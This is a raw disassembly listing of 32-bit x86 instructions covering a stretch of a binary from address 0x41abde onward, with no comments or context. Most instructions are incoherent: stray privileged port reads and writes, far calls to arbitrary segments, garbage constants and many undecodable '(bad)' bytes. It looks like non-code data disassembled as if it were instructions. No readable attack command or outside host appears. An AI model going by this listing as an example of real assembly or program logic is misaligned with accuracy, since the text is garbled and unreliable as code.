  41abde:	jbe    0x41abff
  41abe0:	nop
  41abe1:	jmp    0xc08830a8
  41abe6:	mov    dh,0xb3
  41abe8:	xchg   esi,eax
  41abe9:	iret   
  41abea:	jmp    DWORD PTR [ebp+0x4931a323]
  41abf0:	stos   DWORD PTR es:[edi],eax
  41abf1:	add    al,0x86
  41abf3:	cmp    ecx,0xfa292287
  41abf9:	inc    esp
  41abfa:	push   0xffffffe9
  41abfc:	movnti DWORD PTR [esi+0x698e34a6],ebx
  41ac03:	retf   0x2b90
  41ac06:	(bad)
  41ac09:	xchg   edi,eax
  41ac0a:	jo     0x41ac0f
  41ac0c:	xor    al,0xf6
  41ac0e:	scas   al,BYTE PTR es:[edi]
  41ac0f:	sub    al,0xbf
  41ac11:	sub    eax,0xa3c258b0
  41ac16:	in     eax,0xf3
  41ac18:	fidiv  DWORD PTR [eax]
  41ac1a:	push   esp
  41ac1b:	call   0x395d8f1
  41ac20:	push   es
  41ac21:	sbb    BYTE PTR [eax],bh
  41ac23:	cdq    
  41ac24:	stos   DWORD PTR es:[edi],eax
  41ac25:	pop    ds
  41ac26:	iret   
  41ac27:	or     edx,esi
  41ac29:	jl     0x41ac29
  41ac2b:	cmp    ebx,edi
  41ac2d:	and    al,0x42
  41ac2f:	jne    0x41ac0c
  41ac31:	pop    ds
  41ac32:	pop    ebp
  41ac33:	inc    edi
  41ac34:	lods   al,BYTE PTR ds:[esi]
  41ac35:	call   0x65db:0xcb2edc44
  41ac3c:	mov    ebx,0x2c00cd84
  41ac41:	xchg   DWORD PTR [edi],ecx
  41ac43:	add    eax,0xe5abf90c
  41ac48:	and    esi,DWORD PTR [edi+0x61]
  41ac4b:	in     al,0xbf
  41ac4d:	xor    al,0xca
  41ac4f:	out    0x79,eax
  41ac51:	test   eax,0x8cfbbbe7
  41ac56:	out    dx,eax
  41ac57:	sub    cl,BYTE PTR [eax]
  41ac59:	push   esp
  41ac5a:	cmp    BYTE PTR [edx],0xf4
  41ac5d:	in     al,0xea
  41ac5f:	(bad)  
  41ac60:	shl    ecx,1
  41ac62:	jnp    0x41acb9
  41ac64:	cmp    ebp,DWORD PTR [ebx-0x3b9b7962]
  41ac6a:	and    ecx,DWORD PTR ds:0x190e8dfb
  41ac70:	and    BYTE PTR [ecx+0x4b6c50ee],bh
  41ac76:	mov    dl,0x16
  41ac78:	xor    bh,ah
  41ac7a:	xchg   ebx,eax
  41ac7b:	push   esi
  41ac7c:	and    edx,DWORD PTR [ebx]
  41ac7e:	and    al,0x86
  41ac80:	cmc    
  41ac81:	imul   ebp,DWORD PTR [edx-0x63],0xbfe5d017
  41ac88:	leave  
  41ac89:	pop    ebx
  41ac8a:	mov    eax,0xb6805cb8
  41ac8f:	pop    es
  41ac90:	pop    eax
  41ac91:	pop    eax
  41ac92:	pop    esp
  41ac93:	shr    ecx,0xc5
  41ac96:	(bad)  
  41ac97:	clc    
  41ac98:	cmp    esp,esp
  41ac9a:	loope  0x41acc4
  41ac9c:	pusha  
  41ac9d:	enter  0xc6af,0xd2
  41aca1:	js     0x41ac74
  41aca3:	jp     0x41ac54
  41aca5:	mul    BYTE PTR [edx+ebp*2]
  41aca8:	cmp    edi,esi
  41acaa:	adc    cl,BYTE PTR [ebx+0x50]
  41acad:	retf   0xb8a2
  41acb0:	loope  0x41ad0d
  41acb2:	mov    dh,0xa8
  41acb4:	ins    DWORD PTR es:[edi],dx
  41acb5:	cmp    dl,dh
  41acb7:	cmp    BYTE PTR [esi-0x7b0d40c0],ch
  41acbd:	xor    ch,BYTE PTR [eax-0x3a]
  41acc0:	call   0xad32f0e9
  41acc5:	pop    ebx
  41acc6:	in     eax,dx
  41acc7:	scas   eax,DWORD PTR es:[edi]
  41acc8:	push   edx
  41acc9:	sbb    BYTE PTR [ecx+0x4ca1df70],dh
  41accf:	(bad)  
  41acd0:	ja     0x41ad3f
  41acd2:	call   0x9bb2:0xd9d250c3
  41acd9:	push   ebp
  41acda:	xor    BYTE PTR [edi+ebp*2],ch
  41acdd:	pusha  
  41acde:	cwde   
  41acdf:	fsqrt  
  41ace1:	out    dx,eax
  41ace2:	dec    ebx
  41ace3:	pop    ss
  41ace4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ace5:	mov    WORD PTR [esi],ss
  41ace7:	mov    eax,ds:0xaa8c7fac
  41acec:	rcl    DWORD PTR [ebp-0x1d],0xae
  41acf0:	pop    es
  41acf1:	fmul   DWORD PTR [ebx+0x599cf0f2]
  41acf7:	in     al,0x42
  41acf9:	cmp    dl,bl
  41acfb:	shl    BYTE PTR [ebp+0x13],0xe3
  41acff:	inc    eax
  41ad00:	out    0x8c,eax
  41ad02:	cmp    al,0x3d
  41ad04:	mov    dh,0x8a
  41ad06:	mov    eax,ds:0x781a44d0
  41ad0b:	cmc    
  41ad0c:	ins    BYTE PTR es:[edi],dx
  41ad0d:	mov    esp,DWORD PTR [eax-0x27be41f6]
  41ad13:	adc    eax,0x3d0815d0
  41ad18:	pop    edx
  41ad19:	sub    eax,0xf6fe9d69
  41ad1e:	mov    esi,0x24b2b11c
  41ad23:	inc    edx
  41ad24:	aad    0x36
  41ad26:	jns    0x41ad21
  41ad28:	out    0xf9,eax
  41ad2a:	loop   0x41ad70
  41ad2c:	mov    esi,0x984c1b7
  41ad31:	test   eax,0x935177a7
  41ad36:	bound  ebx,QWORD PTR [edi]
  41ad38:	data16 and bh,dl
  41ad3b:	mov    dl,0xc5
  41ad3d:	mov    bl,0x47
  41ad3f:	clc    
  41ad40:	mov    edi,ebx
  41ad42:	pop    es
  41ad43:	inc    ebp
  41ad44:	repz inc ecx
  41ad46:	loope  0x41ad3f
  41ad48:	inc    ebp
  41ad49:	stc    
  41ad4a:	imul   ebp,DWORD PTR [esi+0x4c95aaa8],0xfb02f863
  41ad54:	mov    al,0xe4
  41ad56:	pop    edi
  41ad57:	mov    eax,0x3e7efce2
  41ad5c:	out    0x29,eax
  41ad5e:	xchg   edx,eax
  41ad5f:	xor    eax,DWORD PTR ds:0xccc8b3dc
  41ad65:	inc    ecx
  41ad66:	mov    ecx,0x7f5b7b98
  41ad6b:	pop    edi
  41ad6c:	pop    ds
  41ad6d:	xchg   esp,eax
  41ad6e:	(bad)  
  41ad6f:	jecxz  0x41adc7
  41ad71:	cmp    cl,bl
  41ad73:	add    DWORD PTR [eax],esi
  41ad75:	pop    esp
  41ad76:	icebp  
  41ad77:	mov    ah,0xf3
  41ad79:	and    eax,edx
  41ad7b:	xor    edi,DWORD PTR [eax]
  41ad7d:	pop    esp
  41ad7e:	sahf   
  41ad7f:	call   0x2829:0x5db80860
  41ad86:	fwait
  41ad87:	push   ds
  41ad88:	dec    ecx
  41ad89:	mov    cl,0x59
  41ad8b:	xchg   ecx,eax
  41ad8c:	jl     0x41ad6c
  41ad8e:	dec    ebp
  41ad8f:	adc    ah,BYTE PTR [edi+eiz*8-0xa]
  41ad93:	inc    esi
  41ad94:	mov    DWORD PTR [ecx],ebx
  41ad96:	push   0xffffffd2
  41ad98:	(bad)  
  41ad99:	rcl    BYTE PTR [eax],1
  41ad9b:	xchg   edi,eax
  41ad9c:	stos   BYTE PTR es:[edi],al
  41ad9d:	dec    ebx
  41ad9e:	lods   al,BYTE PTR ds:[esi]
  41ad9f:	mov    bh,0x37
  41ada1:	es cmp al,0x74
  41ada4:	lea    edi,[ebp+eiz*8+0x3]
  41ada8:	push   0x9b278fa8
  41adad:	inc    ebp
  41adae:	ja     0x41ade2
  41adb0:	cmp    al,BYTE PTR [esi-0x18ac4140]
  41adb6:	mov    al,0xed
  41adb8:	adc    ebp,eax
  41adba:	mov    BYTE PTR [edi+ebx*4],ah
  41adbd:	xor    eax,0xa58f9184
  41adc2:	sbb    ebp,esi
  41adc4:	mov    eax,0xd557a227
  41adc9:	lahf   
  41adca:	leave  
  41adcb:	sbb    eax,0x7f130e92
  41add0:	sbb    ebp,ecx
  41add2:	mov    DWORD PTR [ebp-0x35c03157],esi
  41add8:	dec    ebp
  41add9:	cmp    esp,ebx
  41addb:	or     BYTE PTR [edi],al
  41addd:	sti    
  41adde:	lock and BYTE PTR [edx],ah
  41ade1:	fcomip st,st(4)
  41ade3:	test   eax,0x21cf33c6
  41ade8:	jne    0x41adf0
  41adea:	out    dx,al
  41adeb:	push   ecx
  41adec:	(bad)  
  41aded:	clc    
  41adee:	jns    0x41adb8
  41adf0:	retf   0x3ef5
  41adf3:	sbb    al,0xdc
  41adf5:	shr    ah,0x8
  41adf8:	repz iret 
  41adfa:	fidivr WORD PTR [esi+edx*2+0xfc933e6]
  41ae01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae02:	rol    DWORD PTR [edx],0xe9
  41ae05:	xchg   ecx,eax
  41ae06:	add    al,BYTE PTR [eax]
  41ae08:	add    BYTE PTR [esi-0x8101c85],cl
  41ae0e:	mov    bh,0x97
  41ae10:	fwait
  41ae11:	(bad)  
  41ae12:	in     eax,0x3b
  41ae14:	jno    0x41adf9
  41ae16:	pop    eax
  41ae17:	sbb    eax,0xc13e7945
  41ae1c:	mov    ebx,0xbbbbbfa8
  41ae21:	mov    ecx,0xbd0b3513
  41ae26:	jge    0x41adad
  41ae28:	mov    ebp,0xa2573cda
  41ae2d:	je     0x41ae4c
  41ae2f:	sub    ebx,esi
  41ae31:	xchg   edi,eax
  41ae32:	xor    DWORD PTR [edi+0x51],eax
  41ae35:	xchg   DWORD PTR ds:0xcdaa455d,ecx
  41ae3b:	add    eax,0xa9415a1f
  41ae40:	popa   
  41ae41:	and    DWORD PTR [ebx+0x70459e1],ebx
  41ae47:	mov    ebp,edx
  41ae49:	out    0xa1,al
  41ae4b:	arpl   WORD PTR [ebp-0x201b3015],dx
  41ae51:	pop    ebx
  41ae52:	pop    esp
  41ae53:	loop   0x41aeb2
  41ae55:	inc    ebp
  41ae56:	jo     0x41ae9a
  41ae58:	ret    0xd1a3
  41ae5b:	(bad)  
  41ae5d:	sar    DWORD PTR [edi-0x41],1
  41ae60:	and    esi,ecx
  41ae62:	xor    BYTE PTR [esi-0xa9b4349],0xe5
  41ae69:	or     eax,0x9fe9aa4f
  41ae6e:	xchg   edx,eax
  41ae6f:	cwde   
  41ae70:	mov    ds:0xf4545025,al
  41ae75:	dec    eax
  41ae76:	clc    
  41ae77:	loope  0x41aef7
  41ae79:	stos   DWORD PTR es:[edi],eax
  41ae7a:	inc    eax
  41ae7b:	neg    DWORD PTR ds:0x28873957
  41ae81:	or     al,0x65
  41ae83:	or     ecx,edx
  41ae85:	push   ebx
  41ae86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae87:	fsub   QWORD PTR [eax+ebx*8+0x29bbab6e]
  41ae8e:	lds    esi,FWORD PTR [ebx-0x7f]
  41ae91:	or     ecx,DWORD PTR ds:0xbc1b31d1
  41ae97:	in     al,dx
  41ae98:	adc    eax,DWORD PTR [esi]
  41ae9a:	jmp    eax
  41ae9c:	int    0xd6
  41ae9e:	call   0x14958eab
  41aea3:	push   ebp
  41aea4:	mov    bl,BYTE PTR [esi-0x2c0e1743]
  41aeaa:	mov    bl,0x5
  41aeac:	or     eax,0xd771093d
  41aeb1:	iret   
  41aeb2:	icebp  
  41aeb3:	je     0x41aee6
  41aeb5:	inc    ebx
  41aeb6:	push   ebx
  41aeb7:	leave  
  41aeb8:	cmp    ebp,DWORD PTR [edi+ebp*4+0x34c30306]
  41aebf:	popa   
  41aec0:	out    dx,al
  41aec1:	ret    0x5a0d
  41aec4:	push   cs
  41aec5:	xchg   ecx,eax
  41aec6:	retf   0xc9c8
  41aec9:	lahf   
  41aeca:	test   DWORD PTR [edi-0x21],edi
  41aecd:	add    esi,ebp
  41aecf:	fidiv  WORD PTR [edi]
  41aed1:	mov    BYTE PTR [edx+0x71ba43ae],bh
  41aed7:	sbb    BYTE PTR [eax+0x39],dh
  41aeda:	mov    gs,WORD PTR [ebx]
  41aedc:	or     ah,BYTE PTR [eax-0x8]
  41aedf:	xchg   DWORD PTR [ebp-0x107f4d6d],edi
  41aee5:	ror    DWORD PTR [ecx],cl
  41aee7:	idiv   edi
  41aee9:	test   DWORD PTR [ebp+eiz*8-0x38a4964f],eax
  41aef0:	dec    ebp
  41aef1:	lods   eax,DWORD PTR ss:[esi]
  41aef3:	jno    0x41af2a
  41aef5:	mov    bl,0xcb
  41aef7:	in     eax,0x0
  41aef9:	push   es
  41aefa:	xchg   ebp,eax
  41aefb:	pop    esi
  41aefc:	cmp    DWORD PTR [edi+edi*4],ebp
  41aeff:	sbb    eax,0xaed8f1a
  41af04:	and    BYTE PTR [ecx-0x74426d21],dh
  41af0a:	sub    ecx,DWORD PTR [edx+0x422530fd]
  41af10:	stos   BYTE PTR es:[edi],al
  41af11:	cwde   
  41af12:	adc    ebx,esp
  41af14:	xor    DWORD PTR [ebp+0x2d735e8e],ecx
  41af1a:	pop    ebp
  41af1b:	or     bh,al
  41af1d:	fsub   DWORD PTR fs:[edx]
  41af20:	scas   eax,DWORD PTR es:[edi]
  41af21:	push   esi
  41af22:	int3   
  41af23:	xchg   ebp,eax
  41af24:	push   cs
  41af25:	das    
  41af26:	and    eax,0x7965bd6b
  41af2b:	sub    al,0x49
  41af2d:	pop    esp
  41af2e:	jg     0x41af9d
  41af30:	inc    ebx
  41af31:	jnp    0x41aef4
  41af33:	sar    BYTE PTR [esi-0x36],cl
  41af36:	ins    DWORD PTR es:[edi],dx
  41af37:	sub    eax,0x3c2d07f
  41af3c:	mov    ecx,0x23886258
  41af41:	enter  0xe6ba,0x5
  41af45:	pop    edx
  41af46:	jb     0x41afa7
  41af48:	popf   
  41af49:	not    dh
  41af4b:	jae    0x41af38
  41af4d:	arpl   WORD PTR [edi],sp
  41af4f:	xchg   BYTE PTR [edx],dh
  41af51:	ret    0xc062
  41af54:	das    
  41af55:	(bad)  
  41af56:	int    0x85
  41af58:	mov    ebp,0x6cb9af3c
  41af5d:	inc    esi
  41af5e:	push   eax
  41af5f:	pop    edx
  41af60:	(bad)  
  41af61:	xchg   ecx,eax
  41af62:	dec    ebp
  41af63:	cli    
  41af64:	add    ebx,DWORD PTR [ebx-0x79827ee7]
  41af6a:	xor    ah,ch
  41af6c:	cmp    BYTE PTR [eax-0x46d78420],dh
  41af72:	aam    0xf8
  41af74:	ror    BYTE PTR [ebx+0x7a],cl
  41af77:	or     ebx,eax
  41af79:	mov    bh,bh
  41af7b:	icebp  
  41af7c:	(bad)  
  41af7d:	mov    bl,0xce
  41af7f:	cli    
  41af80:	push   ss
  41af81:	daa    
  41af82:	dec    ecx
  41af83:	test   BYTE PTR [ebx+edi*4+0x63e2336d],0xe1
  41af8b:	cmp    BYTE PTR [ebp-0x72fa44ff],ah
  41af91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af92:	jle    0x41af69
  41af94:	cmp    DWORD PTR [eax],0x9ca1d5fd
  41af9a:	push   ds
  41af9b:	sbb    eax,0x9754fb40
  41afa0:	dec    ebp
  41afa1:	xor    al,0xc2
  41afa3:	inc    esi
  41afa4:	mov    edi,0x2bf3099c
  41afa9:	lods   al,BYTE PTR ds:[esi]
  41afaa:	stc    
  41afab:	lock das 
  41afad:	jge    0x41af9b
  41afaf:	outs   dx,BYTE PTR ss:[esi]
  41afb1:	adc    edi,DWORD PTR [ecx-0x8]
  41afb4:	js     0x41af69
  41afb6:	fsub   QWORD PTR [edx+ecx*4]
  41afb9:	clc    
  41afba:	and    cl,BYTE PTR ds:0x1a005a18
  41afc0:	add    al,0x6a
  41afc2:	jg     0x41af77
  41afc4:	push   ds
  41afc5:	leave  
  41afc6:	outs   dx,BYTE PTR ds:[esi]
  41afc7:	xor    DWORD PTR [edx+0xe73ee74],ebx
  41afcd:	mov    edi,0x200d61d0
  41afd2:	popa   
  41afd3:	in     al,dx
  41afd4:	xor    bl,0x24
  41afd7:	cwde   
  41afd8:	jne    0x41afa9
  41afda:	pop    esi
  41afdb:	out    dx,eax
  41afdc:	sub    DWORD PTR ds:0x3c831ba6,edi
  41afe2:	ja     0x41afc2
  41afe4:	int    0x77
  41afe6:	add    eax,0xd1639f04
  41afeb:	xor    eax,0x3aa7462d
  41aff0:	out    0xb4,al
  41aff2:	lea    edx,[eax-0x8]
  41aff5:	mov    ecx,0x81d7cd0b
  41affa:	or     eax,0xc0fd7013
  41afff:	or     DWORD PTR [ebp-0x2f],eax
  41b002:	xor    DWORD PTR [eax],eax
  41b004:	xchg   ecx,eax
  41b005:	test   al,0x70
  41b007:	(bad)  
  41b008:	(bad)  
  41b009:	outs   dx,DWORD PTR ds:[esi]
  41b00a:	or     DWORD PTR [eax+0x38ce3924],edi
  41b010:	adc    eax,0xcf1091ec
  41b015:	stos   DWORD PTR es:[edi],eax
  41b016:	add    dh,BYTE PTR [ebp-0x3f]
  41b019:	mov    cl,0x80
  41b01b:	xchg   ebp,edx
  41b01d:	dec    ebx
  41b01e:	push   eax
  41b01f:	hlt    
  41b020:	(bad)  
  41b021:	ffree  st(2)
  41b023:	dec    ecx
  41b024:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b025:	test   DWORD PTR [edx+edx*1+0x7a],ebp
  41b029:	cli    
  41b02a:	jg     0x41b026
  41b02c:	mov    edx,esi
  41b02e:	xor    eax,0x3e88ffa2
  41b033:	jle    0x41b09a
  41b035:	enter  0x8c8f,0xd8
  41b039:	add    eax,0x7e61559b
  41b03e:	(bad)  
  41b03f:	cli    
  41b040:	je     0x41b0b9
  41b042:	xlat   BYTE PTR ds:[ebx]
  41b043:	add    ecx,ebx
  41b045:	xchg   ebx,eax
  41b046:	repz fdivr QWORD PTR [eax-0x3]
  41b04a:	fstp   QWORD PTR [ecx]
  41b04c:	dec    edi
  41b04d:	jmp    0x41b029
  41b04f:	add    al,0x92
  41b051:	jp     0x41b041
  41b053:	add    al,0x95
  41b055:	ss pop edx
  41b057:	sub    eax,0x95a75941
  41b05c:	out    0xb2,al
  41b05e:	stos   BYTE PTR es:[edi],al
  41b05f:	or     edi,DWORD PTR [esi+0xed86136]
  41b065:	aam    0x16
  41b067:	aam    0x52
  41b069:	int    0xcb
  41b06b:	stos   DWORD PTR es:[edi],eax
  41b06c:	test   BYTE PTR [eax],bh
  41b06e:	xchg   esi,eax
  41b06f:	shr    DWORD PTR [ebp+0x27],cl
  41b072:	gs clc 
  41b074:	mov    ds:0xa4ca8dfd,al
  41b079:	xchg   ebp,eax
  41b07a:	iret   
  41b07b:	stos   DWORD PTR es:[edi],eax
  41b07c:	pop    ss
  41b07d:	cwde   
  41b07e:	jp     0x41b0f0
  41b080:	inc    edx
  41b081:	mov    esi,0x477fe6f4
  41b086:	mov    ecx,ebx
  41b088:	mov    DWORD PTR [esi-0x33],ebx
  41b08b:	pop    edx
  41b08c:	aas    
  41b08d:	mov    edi,0x47470949
  41b092:	adc    DWORD PTR [edi],esi
  41b094:	lods   eax,DWORD PTR ds:[esi]
  41b095:	push   edi
  41b096:	dec    edi
  41b097:	and    ecx,DWORD PTR [eiz*2-0x44fd1f3f]
  41b09e:	jbe    0x41b056
  41b0a0:	mov    ebx,ecx
  41b0a2:	mov    DWORD PTR [esp+0x20],edx
  41b0a6:	mov    edx,DWORD PTR [esp+0x5c]
  41b0aa:	xor    eax,ebx
  41b0ac:	jmp    0x41b342
  41b0b1:	call   0xa1b5:0x75b46fb4
  41b0b8:	mov    ah,0x79
  41b0ba:	add    al,0xea
  41b0bc:	cmp    ebp,ebx
  41b0be:	int    0x6b
  41b0c0:	jno    0x41b120
  41b0c2:	dec    eax
  41b0c3:	sar    DWORD PTR [ebx-0x44444058],0x59
  41b0ca:	ret    0x4186
  41b0cd:	add    cl,BYTE PTR [edx+0xb6a1f03]
  41b0d3:	cdq    
  41b0d4:	mov    eax,0x657edb36
  41b0d9:	jmp    0x41b147
  41b0db:	xor    bh,BYTE PTR [edx+0x5af2747b]
  41b0e1:	jnp    0x41b109
  41b0e3:	pushf  
  41b0e4:	mov    bl,BYTE PTR [esi]
  41b0e6:	adc    al,0x5d
  41b0e8:	sbb    BYTE PTR [edx],dh
  41b0ea:	mov    ecx,0x85508bf2
  41b0ef:	(bad)  
  41b0f0:	push   esp
  41b0f1:	bound  edi,QWORD PTR cs:[eax-0xb]
  41b0f5:	cmp    edx,ebx
  41b0f7:	dec    eax
  41b0f8:	push   edi
  41b0f9:	shr    DWORD PTR [ebp+0x4425feae],cl
  41b0ff:	push   esp
  41b100:	sbb    DWORD PTR [ebx-0x34e25d6f],ebp
  41b106:	shr    DWORD PTR [esi],cl
  41b108:	sub    al,0x41
  41b10a:	loop   0x41b0ed
  41b10c:	add    al,bl
  41b10e:	adc    dl,BYTE PTR [eax]
  41b110:	and    ebx,DWORD PTR [ecx]
  41b112:	repz dec ebp
  41b114:	imul   BYTE PTR [edi+0x5f]
  41b117:	and    DWORD PTR [esi+edx*4-0x4098fcae],esp
  41b11e:	icebp  
  41b11f:	jg     0x41b0db
  41b121:	retf   
  41b122:	mov    ebp,0x73885d22
  41b127:	jmp    0xe8a2d639
  41b12c:	cvttps2pi mm6,xmm0
  41b12f:	in     eax,dx
  41b130:	sbb    DWORD PTR [edi-0x22],edx
  41b133:	sub    edi,DWORD PTR [ebp+0x4b]
  41b136:	mov    edx,0xc1ed75a2
  41b13b:	lahf   
  41b13c:	in     al,0x19
  41b13e:	clc    
  41b13f:	or     DWORD PTR [esi+0x4d],eax
  41b142:	push   ss
  41b143:	hlt    
  41b144:	(bad)  
  41b145:	inc    esi
  41b146:	mov    ds:0x2420c0a1,eax
  41b14b:	je     0x41b0d3
  41b14d:	test   al,0xc1
  41b14f:	mov    esp,0xc53eaaba
  41b154:	into   
  41b155:	imul   eax
  41b157:	pmulhuw mm1,QWORD PTR [edi]
  41b15a:	fisttp DWORD PTR [edi]
  41b15c:	xor    BYTE PTR [edx],ch
  41b15e:	mov    esi,0xe540c045
  41b163:	into   
  41b164:	or     edx,DWORD PTR [eax]
  41b166:	imul   DWORD PTR [eax-0x6bc4a2a6]
  41b16c:	jl     0x41b1e9
  41b16e:	adc    BYTE PTR [esi+ecx*4],ch
  41b171:	cld    
  41b172:	mov    bl,0x87
  41b174:	or     eax,0xf11a4eb6
  41b179:	loopne 0x41b10d
  41b17b:	dec    edi
  41b17c:	sub    DWORD PTR [ebp+0x3f],ebp
  41b17f:	rol    DWORD PTR [ecx],0xc2
  41b182:	or     DWORD PTR [esi-0x53859d62],eax
  41b188:	inc    eax
  41b189:	cmp    dh,BYTE PTR [ebp+0x72bc7e41]
  41b18f:	mov    esp,?
  41b191:	pop    edi
  41b192:	xchg   esp,eax
  41b193:	xchg   ecx,eax
  41b194:	jge    0x41b202
  41b196:	pop    ds
  41b197:	scas   al,BYTE PTR es:[edi]
  41b198:	hlt    
  41b199:	xor    eax,0x365c22f8
  41b19e:	fwait
  41b19f:	dec    ebp
  41b1a0:	xor    eax,0xe100fa56
  41b1a5:	and    dl,BYTE PTR [esi]
  41b1a7:	mov    esp,0x1c814da6
  41b1ac:	test   al,0x27
  41b1ae:	(bad)  
  41b1b0:	jp     0x41b1be
  41b1b2:	adc    edx,ebx
  41b1b4:	xlat   BYTE PTR ds:[ebx]
  41b1b5:	mov    cl,0x6f
  41b1b7:	call   0x44c9:0xbbd452aa
  41b1be:	mov    edi,0x3b4f5e20
  41b1c3:	cmp    DWORD PTR [ebx-0x5083263b],esp
  41b1c9:	cmp    esp,DWORD PTR [ecx-0x4f]
  41b1cc:	cmp    edi,DWORD PTR [ebx+edi*4]
  41b1cf:	pop    edx
  41b1d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1d1:	adc    ebp,DWORD PTR [eax]
  41b1d3:	sbb    bl,BYTE PTR [eax-0xa]
  41b1d6:	lods   al,BYTE PTR ds:[esi]
  41b1d7:	xor    al,0xc8
  41b1d9:	pushf  
  41b1da:	xlat   BYTE PTR ds:[ebx]
  41b1db:	bound  edx,QWORD PTR [edi+0x4e6ef21e]
  41b1e1:	fwait
  41b1e2:	lahf   
  41b1e3:	scas   eax,DWORD PTR es:[edi]
  41b1e4:	aad    0x8a
  41b1e6:	adc    ah,BYTE PTR [edi]
  41b1e8:	ror    BYTE PTR [edx-0x1f],cl
  41b1eb:	mov    BYTE PTR [esi+edi*1],ch
  41b1ee:	jg     0x41b225
  41b1f0:	inc    esp
  41b1f1:	cmp    bh,ah
  41b1f3:	cli    
  41b1f4:	lods   al,BYTE PTR ds:[esi]
  41b1f5:	bnd ret 
  41b1f7:	xor    dl,BYTE PTR [edx-0x5e]
  41b1fa:	xor    eax,0x7431cf00
  41b1ff:	pop    ds
  41b200:	arpl   dx,bp
  41b202:	retf   0x9100
  41b205:	xchg   esi,eax
  41b206:	push   ecx
  41b207:	push   0x2f
  41b209:	ins    DWORD PTR es:[edi],dx
  41b20a:	add    al,0xfd
  41b20c:	adc    edx,esi
  41b20e:	leave  
  41b20f:	adc    eax,DWORD PTR [ecx]
  41b211:	pop    ss
  41b212:	(bad)  
  41b213:	imul   edi,ebp,0xffffffdc
  41b216:	dec    ecx
  41b217:	sbb    DWORD PTR [ebx+esi*8-0x1e],edi
  41b21b:	out    0xdd,eax
  41b21d:	push   0x47
  41b21f:	retf   0x8fd0
  41b222:	fsubr  DWORD PTR [edx]
  41b224:	enter  0x5abc,0x76
  41b228:	cmp    eax,0x9ec6c859
  41b22d:	fstp   st(3)
  41b22f:	call   0xd52b44c1
  41b234:	test   eax,0x8b4efdb4
  41b239:	fnstenv [edi-0x3738c2a4]
  41b23f:	mov    bh,0x63
  41b241:	retf   0x3675
  41b244:	cdq    
  41b245:	aam    0x63
  41b247:	push   ebp
  41b248:	dec    eax
  41b249:	xor    BYTE PTR [edx+0x5597c3b5],al
  41b24f:	pop    edi
  41b250:	into   
  41b251:	xchg   DWORD PTR [ecx-0x6a],edi
  41b254:	jp     0x41b1e5
  41b256:	int3   
  41b257:	dec    edx
  41b258:	nop
  41b259:	xor    DWORD PTR [esi-0x1c088e2c],esp
  41b25f:	mov    ?,WORD PTR [edi]
  41b261:	loopne 0x41b20b
  41b263:	in     al,0xe2
  41b265:	dec    esp
  41b266:	pop    ebx
  41b267:	push   0xc6eea4b3
  41b26c:	mov    dl,BYTE PTR [edx-0x7]
  41b26f:	dec    esp
  41b270:	das    
  41b271:	inc    eax
  41b272:	lahf   
  41b273:	sbb    dl,BYTE PTR [edi+eax*4-0x61]
  41b277:	not    BYTE PTR [ebx-0x1d107255]
  41b27d:	add    BYTE PTR [ebx-0x37],dh
  41b280:	sbb    dh,BYTE PTR [esi+0x4b]
  41b283:	loope  0x41b24b
  41b285:	mul    DWORD PTR [ecx-0x5b]
  41b288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b289:	mov    esp,0xb4aa9521
  41b28e:	retf   0xe7eb
  41b291:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b292:	pop    eax
  41b293:	enter  0xd13e,0xe0
  41b297:	mov    ah,0x59
  41b299:	adc    al,0x8e
  41b29b:	les    edi,FWORD PTR [esi+ebx*2-0x4]
  41b29f:	ins    BYTE PTR es:[edi],dx
  41b2a0:	or     dh,dh
  41b2a2:	xor    esp,edi
  41b2a4:	fidiv  WORD PTR [edi]
  41b2a6:	pop    edx
  41b2a7:	pop    ds
  41b2a8:	pop    esp
  41b2a9:	leave  
  41b2aa:	(bad)  
  41b2ab:	pop    edi
  41b2ac:	les    ebp,FWORD PTR [esi+0x5c365e7d]
  41b2b2:	ror    esi,cl
  41b2b4:	jmp    FWORD PTR [ebx+eiz*4+0x3f]
  41b2b8:	push   ds
  41b2b9:	mov    eax,ds:0xcc31179b
  41b2be:	sub    eax,0xe48ab069
  41b2c3:	pop    es
  41b2c4:	mov    edi,DWORD PTR [eax]
  41b2c6:	pop    DWORD PTR [ebx-0x7783a065]
  41b2cc:	mov    bh,BYTE PTR es:[edi+0x43]
  41b2d0:	or     edx,eax
  41b2d2:	sub    BYTE PTR [eax-0x74c64881],al
  41b2d8:	sub    al,0x1f
  41b2da:	test   DWORD PTR [ebx+0x43],ebx
  41b2dd:	(bad)  
  41b2de:	push   ss
  41b2df:	cmp    eax,0x15b987c3
  41b2e4:	and    BYTE PTR [eax+0x53],al
  41b2e7:	or     al,0x14
  41b2e9:	sub    edi,DWORD PTR [ecx]
  41b2eb:	pusha  
  41b2ec:	xchg   ebp,eax
  41b2ed:	push   0xb
  41b2ef:	jl     0x41b294
  41b2f1:	dec    edx
  41b2f2:	test   DWORD PTR [esi+edi*4+0x28],esp
  41b2f6:	es jnp 0x41b32d
  41b2f9:	mov    gs,WORD PTR [ebp-0x60]
  41b2fc:	mov    dl,0xe8
  41b2fe:	mov    ds:0x8f820e1f,eax
  41b303:	dec    eax
  41b304:	sbb    BYTE PTR [edi-0x5f],dh
  41b307:	fwait
  41b308:	hlt    
  41b309:	sti    
  41b30a:	bound  edx,QWORD PTR [ecx+0x301287ab]
  41b310:	push   cs
  41b311:	sbb    ecx,DWORD PTR [ecx+0x17]
  41b314:	outs   dx,BYTE PTR ds:[esi]
  41b315:	pop    ebp
  41b316:	push   cs
  41b317:	or     DWORD PTR [ecx+0x2b],edi
  41b31a:	adc    cl,BYTE PTR [ebx+0x49e39972]
  41b320:	mov    ebx,0xb80e7a18
  41b325:	sub    DWORD PTR [ebx+0x244fa2b1],esi
  41b32b:	push   ebx
  41b32c:	push   cs
  41b32d:	repnz inc ecx
  41b32f:	add    BYTE PTR [ebx],ah
  41b331:	inc    edx
  41b332:	pop    eax
  41b333:	into   
  41b334:	or     DWORD PTR [eax+0x71d08252],eax
  41b33a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b33b:	dec    esp
  41b33c:	xchg   ebx,eax
